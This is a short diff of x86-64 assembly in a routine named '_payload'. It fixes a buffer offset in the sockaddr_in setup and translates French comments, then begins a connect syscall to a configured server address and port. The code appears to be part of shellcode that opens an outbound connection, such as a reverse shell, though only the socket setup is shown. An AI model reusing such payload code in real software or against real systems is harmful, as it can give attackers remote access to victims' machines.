@@ -68,16 +68,12 @@ _payload:
 	je .clean
 	mov r13, rax
 
-	; Préparer la structure sockaddr_in
-    mov word [rel CONNECT_BUFFER + 1], 2              ; sin_family (AF_INET)
-
-    ; Charger le port dans un registre temporaire et le déplacer dans le buffer
-    movzx rax, word [rel SERVER_PORT]
-    mov word [rel CONNECT_BUFFER + 2], ax             ; sin_port
-
-    ; Charger l'adresse IP dans un registre temporaire et le déplacer dans le buffer
-    mov eax, [rel SERVER_ADDR]
-    mov dword [rel CONNECT_BUFFER + 4], eax           ; sin_addr
+	; Prepare sockaddr_in structure
+	mov word [CONNECT_BUFFER], 2			; sin_family (AF_INET)
+	movzx rax, word [rel SERVER_PORT]
+	mov word [CONNECT_BUFFER + 2], ax		; sin_port
+	mov eax, [rel SERVER_ADDR]				; Load the value from memory into EAX register
+	mov dword [CONNECT_BUFFER + 4], eax		; Move the value from EAX register to the destination memory location
 	
 	; Connect the socket
 	mov rax, 42						; syscall number for connect
